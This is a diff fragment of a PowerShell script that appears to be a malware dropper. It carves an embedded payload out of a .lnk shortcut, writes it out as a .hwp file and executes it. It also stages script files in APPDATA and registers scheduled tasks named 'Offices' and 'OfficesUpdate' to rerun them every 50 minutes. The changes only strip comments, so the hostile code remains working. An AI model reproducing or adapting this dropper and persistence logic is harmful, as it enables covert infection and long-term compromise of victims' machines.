@@ -4,12 +4,11 @@ if($lk -ne $null ){$oP=$lk.fullname.Replace('.lnk','.hwp');
 $file = [System.IO.File]::ReadAllBytes($lk.fullname);$file1=[byte[]]$file[5709..87628];
 [System.IO.File]::WriteAllBytes($op,$file1);&$op;}
 
-######  VB File  #####
 $filepath = $env:APPDATA + "\settings.in"
 $filepath1 = $env:APPDATA + "\stick.in"
-######  PS1 (vb) File  #####
+
 $filepath2 = $env:APPDATA + "\settings.ps1"
-######  Ps1 (else) File  #####
+
 $filepath3 = $env:APPDATA + "\stick.ps1"
 If (Test-Path $filepath){Remove-Item -path $filepath -Force}
 If (Test-Path $filepath1){Remove-Item -path $filepath1 -Force}
@@ -43,6 +42,7 @@ schtasks /create /tn "Offices" /sc minute /st $st /tr $ws /mo 50 /F
 schtasks /create /tn "OfficesUpdate" /sc minute /st $st1 /tr $ws1 /mo 50 /F
 
 ipconfig
+
 
 
 
